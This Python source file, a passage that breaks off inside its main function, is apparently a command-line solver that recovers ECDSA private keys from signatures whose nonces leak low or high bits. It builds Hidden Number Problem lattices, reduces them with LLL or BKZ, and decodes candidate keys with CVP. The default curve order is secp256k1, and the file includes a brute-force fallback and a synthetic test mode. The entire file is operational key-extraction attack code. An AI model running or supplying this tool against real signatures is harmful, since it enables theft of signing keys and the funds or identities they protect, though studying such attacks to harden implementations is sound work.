import argparse
import json
import hashlib
import os
import sys
import time
import random
import numpy as np
import signal
import psutil
try:
    from fpylll import IntegerMatrix, LLL, BKZ
    HAVE_FPYLLL = True
except ImportError:
    HAVE_FPYLLL = False
from hashlib import sha256


def _parse_int_csv(raw):
    vals = []
    if raw is None:
        return vals
    s = str(raw).strip()
    if not s:
        return vals
    for part in s.split(","):
        part = part.strip()
        if not part:
            continue
        vals.append(int(part))
    return vals


def memory_guard(max_mb):
    process = psutil.Process(os.getpid())
    mem = process.memory_info().rss / (1024 * 1024)
    if mem > max_mb:
        print(f"[E_STOP_MEMORY] Exceeded memory cap: {mem:.1f} MB > {max_mb} MB")
        sys.exit(2)

def checkpoint_save(state, out_dir, stage):
    save_json(state, os.path.join(out_dir, f"checkpoint_{stage}.json"))

def checkpoint_load(out_dir, stage):
    path = os.path.join(out_dir, f"checkpoint_{stage}.json")
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    return None

def graceful_exit(signum, frame):
    print(f"[E_STOP_SIGNAL] Received signal {signum}, aborting gracefully.")
    sys.exit(3)

DEFAULT_Q = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # secp256k1


def hnp_feasibility(sample_count, bits_known, q, leakage_model="LSB"):
    q_bits = int(q).bit_length()
    n = max(0, int(sample_count))
    bits = max(0, int(bits_known))
    leakage_bits = n * bits
    recommended_min = q_bits + 32
    unknown_bits_per_nonce = max(0, q_bits - bits)
    return {
        "q_bits": q_bits,
        "sample_count": n,
        "bits_known": bits,
        "leakage_model": str(leakage_model),
        "leakage_bits": leakage_bits,
        "recommended_min_leakage_bits": recommended_min,
        "unknown_bits_per_nonce": unknown_bits_per_nonce,
        "likely_solvable": leakage_bits >= recommended_min,
        "reason": "ok" if leakage_bits >= recommended_min else "not_enough_leakage",
    }


def bounded_lsb_recovery(leaks, q, bits_known, max_candidates):
    """Exact candidate extraction when known-LSB leakage leaves a small k-space.

    This is a correctness fallback for explicit leaks. It does not guess private
    keys; it enumerates the unknown nonce suffix only when bounded by
    --max-candidates, derives d from ECDSA, and validates d against all leaks.
    """
    q_int = int(q)
    bits = int(bits_known)
    if bits <= 0:
        return [], {"ran": False, "reason": "bad_bits_known"}
    unknown_space = (q_int + (1 << bits) - 1) >> bits
    if unknown_space > max(0, int(max_candidates)):
        return [], {
            "ran": False,
            "reason": "unknown_space_too_large",
            "unknown_space": int(unknown_space),
            "max_candidates": int(max_candidates),
        }
    if not leaks:
        return [], {"ran": False, "reason": "no_leaks"}

    r0, s0, m0, known0 = leaks[0]
    candidates = []
    tested = 0
    inv_r0 = pow(int(r0), -1, q_int)
    for x in range(int(unknown_space)):
        k = int(known0) + ((1 << bits) * x)
        if not (1 <= k < q_int):
            continue
        tested += 1
        d = ((int(s0) * k - int(m0)) * inv_r0) % q_int
        score = candidate_score(d, leaks, q_int, bits)
        if int(score.get("match_count", 0)) == len(leaks):
            candidates.append(int(d))

    unique = sorted(set(candidates))
    return unique, {
        "ran": True,
        "reason": "ok",
        "unknown_space": int(unknown_space),
        "tested_candidates": int(tested),
        "validated_candidates": len(unique),
    }

def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            h.update(chunk)
    return h.hexdigest()

def strict_parse_leaks(leaks, q, bits_known):
    valid = []
    rejected = []
    seen = set()
    for idx, rec in enumerate(leaks):
        reason = None
        try:
            r = int(rec.get("r"))
            s = int(rec.get("s"))
            m = int(rec.get("m"))
            known_nonce = int(rec.get("known_nonce_bits", 0))
        except Exception:
            reason = "E_INPUT_TYPE"
            rejected.append({"idx": idx, "reason": reason, "rec": rec})
            continue
        if not (1 <= r < q and 1 <= s < q and 0 <= known_nonce < (1 << bits_known)):
            reason = "E_INPUT_RANGE"
            rejected.append({"idx": idx, "reason": reason, "rec": rec})
            continue
        key = (r, s, m, known_nonce)
        if key in seen:
            reason = "E_INPUT_DUPLICATE"
            rejected.append({"idx": idx, "reason": reason, "rec": rec})
            continue
        seen.add(key)
        valid.append((r, s, m, known_nonce))
    stats = {
        "raw_count": len(leaks),
        "valid_count": len(valid),
        "rejected_count": len(rejected),
        "rejected_reasons": {r["reason"]: 0 for r in rejected}
    }
    for r in rejected:
        stats["rejected_reasons"][r["reason"]] = stats["rejected_reasons"].get(r["reason"], 0) + 1
    return valid, rejected, stats



# --- Mathematically correct HNP lattice for LSB leakage ---
def build_hnp_lattice(leaks, q, bits_known, leakage_model="LSB", lattice_variant="primal", embedding_weight=None):
    """
    Build HNP lattice and target vector for CVP-style decoding.
    Returns a closure make_matrix(scale_num, scale_den, target_last) -> (M, target).
        lattice_variant:
            - "primal": classic (n+1)x(n+1) CVP basis.
            - "embedding": Kannan-style extra coordinate (n+2)x(n+2).
            - "dual_normalized": normalize rows by inverse(B_base) mod q before embedding.
    """
    from fpylll import IntegerMatrix
    n = len(leaks)
    B = 1 << int(bits_known)
    q_int = int(q)
    if embedding_weight is None:
        embedding_weight = max(1, q_int // max(1, B))

    def make_matrix(scale_num=1, scale_den=1, target_last=0):
        if int(scale_num) <= 0 or int(scale_den) <= 0:
            raise ValueError("scale_num and scale_den must be positive")
        if lattice_variant in ("primal", "dual_normalized"):
            dim = n + 1
        elif lattice_variant == "embedding":
            dim = n + 2
        else:
            raise ValueError(f"Unknown lattice_variant: {lattice_variant}")

        M = IntegerMatrix(dim, dim)
        target = []
        for i, (r, s, m, known_nonce) in enumerate(leaks):
            s_inv = pow(int(s), -1, int(q))
            if leakage_model == "LSB":
                u = (-int(r) * s_inv) % int(q)
                t = (int(m) * s_inv - int(known_nonce)) % int(q)
                B_base = B
            elif leakage_model == "MSB":
                klen = int(q).bit_length()
                shift = klen - int(bits_known)
                u = (-int(r) * s_inv) % int(q)
                t = (int(m) * s_inv - (int(known_nonce) << shift)) % int(q)
                B_base = (B << shift)
            else:
                raise ValueError(f"Unknown leakage_model: {leakage_model}")

            if lattice_variant == "dual_normalized":
                # Work in an equivalent normalized congruence:
                # (B_base^-1 * u) * d + x_i ≡ (B_base^-1 * t) (mod q)
                B_inv = pow(int(B_base), -1, q_int)
                u = (int(u) * int(B_inv)) % q_int
                t = (int(t) * int(B_inv)) % q_int
                B_base = 1

            scaled_num = int(B_base) * int(scale_num)
            if scaled_num % int(scale_den) != 0:
                raise ValueError("non-integer scaled B_row")
            B_row = scaled_num // int(scale_den)
            for j in range(n + 1):
                M[i, j] = 0
            M[i, i] = int(B_row)
            M[i, n] = int(u)
            # Keep target in the original modulus domain; sweep only changes B embedding weight.
            target.append(int(t))

        # q-anchor row (present in both variants)
        for j in range(dim):
            M[n, j] = 0
        M[n, n] = int(q_int)
        target.append(int(target_last))

        if lattice_variant == "embedding":
            # Extra embedding coordinate to stabilize CVP geometry.
            for j in range(dim):
                M[n + 1, j] = 0
            M[n + 1, n + 1] = int(embedding_weight)
            target.append(int(embedding_weight))

        return M, tuple(int(x) for x in target)

    return make_matrix


def _closest_vector_cvp(M, target):
    """
    Compatibility wrapper for fpylll CVP API differences across versions.
    """
    from fpylll import CVP
    target_vec = tuple(int(x) for x in target)
    try:
        # Exact/enum-based CVP (can fail on builds with small max enum dimension).
        return CVP.closest_vector(M, target_vec)
    except Exception:
        # Deterministic Babai fallback works for high dimensions and older/newer APIs.
        return CVP.babai(M, target_vec)


def _log_lattice_inputs(leaks, q, bits_known, leakage_model, limit=5):
    print(f"[ALGO] leakage_model={leakage_model} q_bits={int(q).bit_length()} bits_known={int(bits_known)} n={len(leaks)}")
    for i, (r, s, m, known_nonce) in enumerate(leaks[:limit]):
        s_inv = pow(int(s), -1, int(q))
        if leakage_model == "LSB":
            u = (-int(r) * s_inv) % int(q)
            t = (int(m) * s_inv - int(known_nonce)) % int(q)
        else:
            shift = int(q).bit_length() - int(bits_known)
            u = (-int(r) * s_inv) % int(q)
            t = (int(m) * s_inv - (int(known_nonce) << shift)) % int(q)
        print(f"[ALGO] row={i} u={u} t={t} r={int(r)} s={int(s)} known={int(known_nonce)}")


def _matvec(M, vec):
    rows = M.nrows
    cols = M.ncols
    out = [0] * rows
    for i in range(rows):
        s = 0
        for j in range(cols):
            s += int(M[i, j]) * int(vec[j])
        out[i] = s
    return out


def _compute_hnp_residuals(leaks, q, bits_known, d_cand, leakage_model):
    """
    Per-signature congruence diagnostics:
      u_i * d + B_i * x_i ≡ t_i (mod q)
    Uses centered modular lift and B-divisibility gap as robustness diagnostics.
    """
    q_int = int(q)

    def _center_mod(v):
        r = int(v) % q_int
        if r > q_int // 2:
            r -= q_int
        return int(r)

    def _nearest_multiple_gap(v, mod_base):
        b = max(1, int(mod_base))
        rem = abs(int(v)) % b
        return int(min(rem, b - rem))

    rows = []
    centered_abs_residuals = []
    divisibility_gaps = []
    for idx, (r, s, m, known_nonce) in enumerate(leaks):
        s_inv = pow(int(s), -1, q_int)
        u = (-int(r) * s_inv) % q_int
        if leakage_model == "LSB":
            t = (int(m) * s_inv - int(known_nonce)) % q_int
            B_i = 1 << int(bits_known)
        else:
            klen = q_int.bit_length()
            shift = klen - int(bits_known)
            t = (int(m) * s_inv - (int(known_nonce) << shift)) % q_int
            B_i = (1 << int(bits_known)) << shift

        # Residual of u*d - t in Z_q, then centered to [-q/2, q/2].
        lhs_ud = (u * int(d_cand)) % q_int
        mod_res = (lhs_ud - t) % q_int
        centered_res = _center_mod(mod_res)

        # Heuristic x from centered lift and its B-divisibility quality.
        x_hat = int(round(-centered_res / float(max(1, B_i))))
        div_gap = _nearest_multiple_gap(centered_res, B_i)
        centered_abs_residuals.append(abs(int(centered_res)))
        divisibility_gaps.append(int(div_gap))

        rows.append(
            {
                "index": idx,
                "u": int(u),
                "t": int(t),
                "B_i": int(B_i),
                "x_hat": int(x_hat),
                "lhs_mod_q": int(lhs_ud),
                "residual_mod_q": int(mod_res),
                "residual_mod_q_centered": int(centered_res),
                "residual_mod_q_absmin": int(abs(centered_res)),
                "divisibility_gap_B": int(div_gap),
            }
        )
    summary = {
        "count": len(rows),
        "max_absmin_residual_mod_q": max(centered_abs_residuals) if centered_abs_residuals else 0,
        "avg_absmin_residual_mod_q": (sum(centered_abs_residuals) / len(centered_abs_residuals)) if centered_abs_residuals else 0.0,
        "median_absmin_residual_mod_q": (
            sorted(centered_abs_residuals)[len(centered_abs_residuals) // 2] if centered_abs_residuals else 0
        ),
        "nonzero_absmin_residual_count": sum(1 for x in centered_abs_residuals if x != 0),
        "max_divisibility_gap_B": max(divisibility_gaps) if divisibility_gaps else 0,
        "avg_divisibility_gap_B": (sum(divisibility_gaps) / len(divisibility_gaps)) if divisibility_gaps else 0.0,
    }
    return {"summary": summary, "rows": rows}


def _candidate_concordance_stats(leaks, q, bits_known, d_cand, leakage_model):
    """
    Multi-row concordance for a candidate d:
    counts how many rows satisfy small B-divisibility gap under centered residuals.
    """
    q_int = int(q)
    d_int = int(d_cand)
    gaps = []
    support = 0
    total = 0
    for (r, s, m, known_nonce) in leaks:
        s_inv = pow(int(s), -1, q_int)
        u = (-int(r) * s_inv) % q_int
        if leakage_model == "LSB":
            t = (int(m) * s_inv - int(known_nonce)) % q_int
            B_i = 1 << int(bits_known)
        else:
            klen = q_int.bit_length()
            shift = klen - int(bits_known)
            t = (int(m) * s_inv - (int(known_nonce) << shift)) % q_int
            B_i = (1 << int(bits_known)) << shift

        res = (u * d_int - t) % q_int
        if res > q_int // 2:
            res -= q_int
        b = max(1, int(B_i))
        rem = abs(int(res)) % b
        gap = min(rem, b - rem)
        gaps.append(int(gap))
        # row supports candidate if divisibility gap is tiny compared to B.
        if gap <= max(1, b // 16):
            support += 1
        total += 1

    return {
        "support_count": int(support),
        "total_rows": int(total),
        "support_ratio": (float(support) / float(total)) if total else 0.0,
        "avg_gap": (sum(gaps) / len(gaps)) if gaps else 0.0,
        "max_gap": max(gaps) if gaps else 0,
    }


def _top_worst_residuals(hnp_diag_rows, top_k=5):
    rows = list(hnp_diag_rows)
    rows.sort(key=lambda r: int(r.get("residual_mod_q_absmin", 0)), reverse=True)
    return rows[:top_k]


def _candidate_neighborhood(cand, q, radius=8):
    out = []
    for delta in range(-radius, radius + 1):
        out.append((int(cand) + delta) % int(q))
    return out


def _build_perturbed_targets(base_target, row_steps, radius, max_points):
    """
    Deterministic target perturbations to widen CVP decoding search.
    The first entry is always the unmodified target.
    """
    base = [int(x) for x in base_target]
    out = [tuple(base)]
    if int(max_points) <= 1 or int(radius) <= 0:
        return out
    n_rows = min(len(base), len(row_steps))
    for i in range(n_rows):
        step = abs(int(row_steps[i]))
        if step <= 0:
            step = 1
        for mul in range(1, int(radius) + 1):
            for sign in (1, -1):
                t = list(base)
                t[i] = int(t[i]) + int(sign * mul * step)
                out.append(tuple(t))
                if len(out) >= int(max_points):
                    return out
    return out


def recover_private_key(leaks, q, bits_known, reduction_mode="LLL", bkz_blocksize=10):
    """
    Run the mathematically correct HNP lattice attack for LSB-known ECDSA nonces.
    Uses Babai's nearest plane (CVP) to extract d from the reduced basis.
    Returns: list of candidate d, reduction metrics
    """
    if not HAVE_FPYLLL:
        raise RuntimeError("fpylll is required for recovery (pip install fpylll).")
    leakage_model = recover_private_key.leakage_model if hasattr(recover_private_key, "leakage_model") else "LSB"
    lattice_variant = recover_private_key.lattice_variant if hasattr(recover_private_key, "lattice_variant") else "primal"
    embedding_weight = (
        recover_private_key.embedding_weight if hasattr(recover_private_key, "embedding_weight") else None
    )
    debug_algo = bool(getattr(recover_private_key, "debug_algo", False))
    decode_mode = str(getattr(recover_private_key, "decode_mode", "cvp_single") or "cvp_single")
    decode_k = max(1, int(getattr(recover_private_key, "decode_k", 1) or 1))
    decode_perturb_radius = max(0, int(getattr(recover_private_key, "decode_perturb_radius", 0) or 0))
    if debug_algo:
        _log_lattice_inputs(leaks, q, bits_known, leakage_model, limit=5)
    make_matrix = build_hnp_lattice(
        leaks,
        q,
        bits_known,
        leakage_model=leakage_model,
        lattice_variant=lattice_variant,
        embedding_weight=embedding_weight,
    )
    scaling_options = [(1, 1), (2, 1), (1, 2)]
    target_last_options = [0, int(q)//2, -int(q)//2]
    all_candidates = set()
    sweep_metrics = []
    debug_scaling = []
    q_int = int(q)

    def _extract_d_candidate(u, t_i, bx_term):
        # CVP returns a lattice vector in ambient coordinates.
        # For this basis, coordinate i already equals (B_i * x_i), so decode with bx_term directly.
        try:
            u_inv = pow(int(u), -1, q_int)
        except ValueError:
            return None
        bx_mod_q = int(bx_term) % q_int
        rhs = (int(t_i) - bx_mod_q) % q_int
        return (rhs * u_inv) % q_int

    def _variant_row_terms(r, s, m, known_nonce, variant_name):
        s_inv = pow(int(s), -1, q_int)
        if leakage_model == "LSB":
            u_raw = (-int(r) * s_inv) % q_int
            t_raw = (int(m) * s_inv - int(known_nonce)) % q_int
            B_base_raw = 1 << int(bits_known)
        else:
            klen = q_int.bit_length()
            shift = klen - int(bits_known)
            u_raw = (-int(r) * s_inv) % q_int
            t_raw = (int(m) * s_inv - (int(known_nonce) << shift)) % q_int
            B_base_raw = (1 << int(bits_known)) << shift

        if variant_name == "dual_normalized":
            B_inv = pow(int(B_base_raw), -1, q_int)
            return (u_raw * B_inv) % q_int, (t_raw * B_inv) % q_int
        return u_raw, t_raw

    def _candidate_rank(d):
        diag = _compute_hnp_residuals(leaks, q_int, bits_known, int(d), leakage_model)
        sm = diag.get("summary", {})
        score = candidate_score(int(d), leaks, q_int, bits_known)
        conc = _candidate_concordance_stats(leaks, q_int, bits_known, int(d), leakage_model)
        return (
            -float(score.get("match_ratio", 0.0)),
            -int(score.get("match_count", 0)),
            -float(conc.get("support_ratio", 0.0)),
            -int(conc.get("support_count", 0)),
            float(conc.get("avg_gap", 1e300)),
            int(conc.get("max_gap", 10**9)),
            int(sm.get("max_divisibility_gap_B", 10**9)),
            float(sm.get("avg_divisibility_gap_B", 1e300)),
            int(sm.get("nonzero_absmin_residual_count", 10**9)),
            int(sm.get("max_absmin_residual_mod_q", 10**18)),
            int(d),
        )

    for scale_num, scale_den in scaling_options:
        scale_label = f"{scale_num}/{scale_den}"
        for target_last in target_last_options:
            try:
                M, target = make_matrix(scale_num=scale_num, scale_den=scale_den, target_last=target_last)
            except ValueError:
                continue
            t0 = time.time()
            if reduction_mode == "LLL":
                LLL.reduction(M)
            elif reduction_mode == "BKZ":
                BKZ.reduction(M, BKZ.Param(bkz_blocksize))
            else:
                raise ValueError(f"Unknown reduction_mode: {reduction_mode}")
            n = len(leaks)
            d_candidates = set()
            closest_vectors = []
            if decode_mode == "cvp_single":
                c0 = _closest_vector_cvp(M, target)
                closest_vectors = [tuple(int(v) for v in c0)]
            elif decode_mode == "cvp_target_perturb":
                row_steps = [max(1, abs(int(M[i, i]))) for i in range(min(n, M.nrows))]
                perturbed_targets = _build_perturbed_targets(
                    target,
                    row_steps,
                    decode_perturb_radius,
                    decode_k,
                )
                seen_vecs = set()
                for t_pert in perturbed_targets:
                    c_pert = _closest_vector_cvp(M, t_pert)
                    c_key = tuple(int(v) for v in c_pert)
                    if c_key in seen_vecs:
                        continue
                    seen_vecs.add(c_key)
                    closest_vectors.append(c_key)
                    if len(closest_vectors) >= decode_k:
                        break
                if not closest_vectors:
                    c0 = _closest_vector_cvp(M, target)
                    closest_vectors = [tuple(int(v) for v in c0)]
            else:
                raise ValueError(f"Unknown decode_mode: {decode_mode}")

            if debug_algo:
                print(f"[DIAG] variant={lattice_variant} scale={scale_label} target_last={target_last}")
                print(f"[DIAG] lattice M (first 4 rows):")
                for row_idx in range(min(4, M.nrows)):
                    print(f"  {row_idx}: {[int(M[row_idx, j]) for j in range(M.ncols)]}")
                print(f"[DIAG] target: {list(target)}")
                print(f"[DIAG] closest_vector_count={len(closest_vectors)}")
                if closest_vectors:
                    print(f"[DIAG] closest_vector[0]: {list(closest_vectors[0])}")

            for cvec in closest_vectors:
                for i, (r, s, m, known_nonce) in enumerate(leaks):
                    u, t_i = _variant_row_terms(r, s, m, known_nonce, lattice_variant)
                    bx_i = int(cvec[i])
                    d_i = _extract_d_candidate(u, t_i, bx_i)
                    if d_i is None:
                        if debug_algo:
                            print(f"[DIAG] row={i} u={u} not invertible mod q")
                        continue  # skip if u not invertible
                    d_candidates.add(d_i)
                    if debug_algo:
                        print(f"[DIAG] row={i} bx_i={bx_i} t_i={t_i} u={u} d_i={d_i}")
            # NOTE:
            # Do not derive candidates directly from reduced-basis rows.
            # After LLL/BKZ, rows are mixed lattice vectors and no longer represent
            # per-signature CVP closest coordinates; using them injects unsound noise.

            # Consensus decode: pick per-sweep candidate with best multi-row concordance.
            if d_candidates:
                consensus_rows = []
                for dc in d_candidates:
                    conc = _candidate_concordance_stats(leaks, q_int, bits_known, int(dc), leakage_model)
                    sc = candidate_score(int(dc), leaks, q_int, bits_known)
                    consensus_rows.append((int(dc), conc, sc))
                consensus_best = min(
                    consensus_rows,
                    key=lambda row: (
                        -float(row[1].get("support_ratio", 0.0)),
                        -int(row[1].get("support_count", 0)),
                        float(row[1].get("avg_gap", 1e300)),
                        -float(row[2].get("match_ratio", 0.0)),
                        int(row[0]),
                    ),
                )
                d_candidates.add(int(consensus_best[0]))

            all_candidates.update(d_candidates)

            base_target_int = [int(x) for x in target]
            vector_rows = []
            for cvec in closest_vectors:
                mv = _matvec(M, cvec)
                residual_vec = [int(mv[i] - base_target_int[i]) for i in range(len(base_target_int))]
                vector_rows.append(
                    {
                        "closest": [int(x) for x in cvec],
                        "matvec_minus_target_l1": int(sum(abs(x) for x in residual_vec)),
                        "matvec_minus_target_linf": int(max((abs(x) for x in residual_vec), default=0)),
                    }
                )
            best_vec_row = min(
                vector_rows,
                key=lambda r: (
                    int(r.get("matvec_minus_target_linf", 10**30)),
                    int(r.get("matvec_minus_target_l1", 10**30)),
                ),
            ) if vector_rows else {"closest": [], "matvec_minus_target_l1": 0, "matvec_minus_target_linf": 0}
            sweep_metrics.append(
                {
                    "scale": scale_label,
                    "target_last": int(target_last),
                    "runtime_sec": float(time.time() - t0),
                    "candidate_count": int(len(d_candidates)),
                    "closest_vector_count": int(len(closest_vectors)),
                    "closest_vector": best_vec_row.get("closest", []),
                    "target_vector": base_target_int,
                    "matvec_minus_target_l1": int(best_vec_row.get("matvec_minus_target_l1", 0)),
                    "matvec_minus_target_linf": int(best_vec_row.get("matvec_minus_target_linf", 0)),
                }
            )

            if debug_algo:
                debug_scaling.append({
                    "scale": scale_label,
                    "target_last": target_last,
                    "closest_vector_count": int(len(closest_vectors)),
                    "closest_vector": best_vec_row.get("closest", []),
                    "d_candidates": list(d_candidates)
                })

    ordered_candidates = sorted(all_candidates, key=_candidate_rank)
    best_candidate = int(ordered_candidates[0]) if ordered_candidates else 0
    hnp_diag = _compute_hnp_residuals(leaks, q_int, bits_known, best_candidate, leakage_model)
    best_concordance = _candidate_concordance_stats(leaks, q_int, bits_known, best_candidate, leakage_model)

    best_sweep = None
    if sweep_metrics:
        best_sweep = min(
            sweep_metrics,
            key=lambda m: (
                int(m.get("matvec_minus_target_linf", 10**30)),
                int(m.get("matvec_minus_target_l1", 10**30)),
                -int(m.get("candidate_count", 0)),
            ),
        )

    reduction_metrics = {
        "matrix_dim": (len(leaks) + 1),
        "runtime_sec": float(sum(m.get("runtime_sec", 0.0) for m in sweep_metrics)),
        "candidate_count": int(len(ordered_candidates)),
        "leakage_model": leakage_model,
        "lattice_variant": lattice_variant,
        "decode_mode": decode_mode,
        "decode_k": int(decode_k),
        "decode_perturb_radius": int(decode_perturb_radius),
        "embedding_weight": int(embedding_weight) if embedding_weight is not None else None,
        "reduction_mode": reduction_mode,
        "bkz_blocksize": bkz_blocksize if reduction_mode == "BKZ" else None,
        "selected_best_candidate": best_candidate,
        "selection_strategy": "nonce_match_then_concordance_then_residual_tiebreak",
        "selected_concordance": best_concordance,
        "hnp_diag_summary": hnp_diag.get("summary", {}),
    }
    if best_sweep is not None:
        reduction_metrics.update(
            {
                "best_sweep_scale": best_sweep.get("scale"),
                "best_sweep_target_last": best_sweep.get("target_last"),
                "closest_vector": best_sweep.get("closest_vector", []),
                "target_vector": best_sweep.get("target_vector", []),
                "matvec_minus_target_l1": best_sweep.get("matvec_minus_target_l1", 0),
                "matvec_minus_target_linf": best_sweep.get("matvec_minus_target_linf", 0),
            }
        )

    if debug_algo:
        print(f"[ALGO] scaling/target/basis sweep debug: {debug_scaling}")
        print(f"[ALGO] selected_best_candidate={best_candidate}")
        print(f"[ALGO] selected_hnp_diag_summary={hnp_diag.get('summary', {})}")
    return ordered_candidates, reduction_metrics, hnp_diag
def synthetic_fixture_lsb(n=8, bits_known=6, q=DEFAULT_Q):
    # Generate cryptographically correct ECDSA signatures with LSB-known nonces and known d
    from ecdsa import SECP256k1, SigningKey
    curve = SECP256k1
    G = curve.generator
    d = random.randrange(1, q)
    sk = SigningKey.from_secret_exponent(d, curve=curve)
    leaks = []
    for _ in range(n):
        k = random.randrange(1 << bits_known, q)
        known = k & ((1 << bits_known) - 1)
        m = random.randrange(1, q)
        # ECDSA: R = k*G, r = R.x % q
        R = k * G
        r = R.x() % q
        s = pow(k, -1, q) * (m + r * d) % q
        leaks.append({"r": r, "s": s, "m": m, "known_nonce_bits": known})
    return leaks, d

def candidate_score(candidate, leaks, q, bits_known):
    """
    Deterministic scoring by nonce-bit consistency:
    k = (m + r*d) * s^{-1} mod q
    candidate is stronger if recovered k matches known low bits across many leaks.
    """
    if not (1 <= int(candidate) < int(q)):
        return {
            "score": 0.0,
            "match_count": 0,
            "mismatch_count": len(leaks),
            "match_ratio": 0.0,
        }
    mask = (1 << bits_known) - 1
    match = 0
    mismatch = 0
    for (r, s, m, known_nonce) in leaks:
        try:
            s_inv = pow(int(s), -1, int(q))
            k_rec = ((int(m) + int(r) * int(candidate)) * s_inv) % int(q)
            if (k_rec & mask) == int(known_nonce):
                match += 1
            else:
                mismatch += 1
        except Exception:
            mismatch += 1
    total = len(leaks)
    ratio = (match / total) if total else 0.0
    return {
        "score": ratio,
        "match_count": match,
        "mismatch_count": mismatch,
        "match_ratio": ratio,
    }


def validate_candidate(candidate, leaks, q, bits_known):
    """
    Lightweight validation bands based on low-bit consistency.
    """
    base_ok = (1 <= int(candidate) < int(q))
    metrics = candidate_score(candidate, leaks, q, bits_known)
    ratio = float(metrics["match_ratio"])
    if not base_ok:
        confidence = "reject"
    elif ratio >= 0.98:
        confidence = "high"
    elif ratio >= 0.90:
        confidence = "medium"
    elif ratio >= 0.75:
        confidence = "low"
    else:
        confidence = "reject"
    return {
        "candidate": int(candidate),
        "confidence": confidence,
        "checks": [base_ok, ratio >= 0.75],
        **metrics,
    }


def candidate_pipeline(candidates, leaks, q, bits_known, top_k=10):
    rows = []
    for d in candidates:
        row = validate_candidate(d, leaks, q, bits_known)
        rows.append(row)
    rows.sort(
        key=lambda x: (
            {"high": 3, "medium": 2, "low": 1, "reject": 0}.get(x["confidence"], 0),
            x["score"],
            -x["candidate"],
        ),
        reverse=True,
    )
    return rows[:top_k], rows

def summarize_confidence(table):
    bands = {"high": 0, "medium": 0, "low": 0, "reject": 0}
    for row in table:
        bands[row["confidence"]] += 1
    return bands

def save_json(obj, path):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2)

def main():
    # Stop conditions
    signal.signal(signal.SIGINT, graceful_exit)
    signal.signal(signal.SIGTERM, graceful_exit)
    parser = argparse.ArgumentParser(description="HNP/LLL/BKZ Key-Recovery Solver (Automated)")
    parser.add_argument("--input", required=False, help="Input leaks JSONL file (fields: r,s,m,known_nonce_bits)")
    parser.add_argument("--bits-known", type=int, required=False, help="Number of known bits in nonce")
    parser.add_argument("--q", type=str, default=str(DEFAULT_Q), help="Curve order (int or hex)")
    parser.add_argument("--seed", type=int, default=0, help="Random seed for deterministic runs")
    parser.add_argument("--run-id", type=str, default=None, help="Run ID (default: sha256(input)+timestamp)")
    parser.add_argument("--config", type=str, default=None, help="Optional config JSON file")
    parser.add_argument("--output-dir", type=str, default=None, help="Output folder (default: runs/<timestamp>_<runid>)")
    parser.add_argument("--max-runtime", type=int, default=600, help="Max runtime in seconds (default: 600)")
    parser.add_argument("--max-memory-mb", type=int, default=2048, help="Max memory in MB (default: 2048)")
    parser.add_argument("--max-candidates", type=int, default=1000, help="Max candidate expansion (default: 1000)")
    parser.add_argument("--resume", type=str, default=None, help="Resume from checkpoint in given run dir")
    parser.add_argument("--debug-sensitive", action="store_true", help="Opt-in: log sensitive candidate data")
    parser.add_argument("--leakage-model", type=str, default="LSB", choices=["LSB", "MSB"], help="Nonce leakage model (LSB or MSB)")
    parser.add_argument("--reduction-mode", type=str, default="LLL", choices=["LLL", "BKZ"], help="Lattice reduction mode")
    parser.add_argument("--bkz-blocksize", type=int, default=10, help="BKZ block size (if using BKZ)")
    parser.add_argument("--synthetic-test", action="store_true", help="Run synthetic regression test (CI mode)")
    parser.add_argument(
        "--allow-synthetic-failure",
        action="store_true",
        help="Diagnostic mode: keep exit code 0 even when --synthetic-test fails",
    )
    parser.add_argument("--debug-algo", action="store_true", help="Verbose algorithm-correctness logs")
    parser.add_argument("--synthetic-n", type=int, default=8, help="Synthetic sample count (default: 8)")
    parser.add_argument(
        "--synthetic-n-sweep",
        type=str,
        default="",
        help="Comma-separated synthetic n sweep, e.g. '8,16,32,64'",
    )
    parser.add_argument(
        "--synthetic-bits-sweep",
        type=str,
        default="",
        help="Comma-separated bits-known sweep for synthetic compare, e.g. '6,8,10,12'",
    )
    parser.add_argument(
        "--lattice-variant",
        type=str,
        default="primal",
        choices=["primal", "embedding", "dual_normalized"],
        help="Lattice formulation variant",
    )
    parser.add_argument(
        "--embedding-weight",
        type=int,
        default=0,
        help="Embedding coordinate weight (0 = auto)",
    )
    parser.add_argument(
        "--compare-lattice-variants",
        action="store_true",
        help="Run both primal/embedding and automatically compare (synthetic-friendly)",
    )
    parser.add_argument(
        "--compare-decoders",
        action="store_true",
        help="Run both single and perturb decoders and automatically compare (synthetic-friendly)",
    )
    parser.add_argument(
        "--decode-mode",
        type=str,
        default="cvp_single",
        choices=["cvp_single", "cvp_target_perturb"],
        help="Decoder family: single CVP or multi-target CVP perturb search",
    )
    parser.add_argument(
        "--decode-k",
        type=int,
        default=32,
        help="Max closest vectors to keep in perturb decode mode",
    )
    parser.add_argument(
        "--decode-perturb-radius",
        type=int,
        default=2,
        help="Per-row perturb radius (in row-step multiples) for perturb decode",
    )
    args = parser.parse_args()

    # Config merge
    config = vars(args).copy()
    if args.config:
        with open(args.config, "r", encoding="utf-8") as f:
            config.update(json.load(f))

    # Minimal argument sanity checks
    if not config.get("synthetic_test") and not config.get("input"):
        print("[E_INPUT_REQUIRED] --input is required unless --synthetic-test is enabled.")
        sys.exit(1)
    if config.get("bits_known") is None:
        print("[E_BITS_REQUIRED] --bits-known is required.")
        sys.exit(1)
    if int(config["bits_known"]) <= 0 or int(config["bits_known"]) >= 256:
        print("[E_BITS_RANGE] --bits-known must be in range [1, 255].")
        sys.exit(1)

    # Determinism
    random.seed(config["seed"])
    np.random.seed(config["seed"])

    # Input hash and run-id
    input_hash = sha256_file(config["input"]) if config.get("input") else "synthetic"
    timestamp = int(time.time())
    run_id = config["run_id"] or (input_hash[:8] + f"_{timestamp}")
    out_dir = config["output_dir"] or os.path.join("runs", f"{timestamp}_{run_id}")
    os.makedirs(out_dir, exist_ok=True)

    # Resume support
    if config.get("resume"):
        print(f"[RESUME] Loading checkpoint from {config['resume']}")
        state = checkpoint_load(config["resume"], "pipeline")
        if state:
            print(f"[RESUME] Restored state: {list(state.keys())}")
            # Optionally, resume from state (not implemented in this stub)

    # Stop conditions: runtime/memory
    start_time = time.time()

    # Synthetic test mode (for CI/regression)
    if config.get("synthetic_test"):
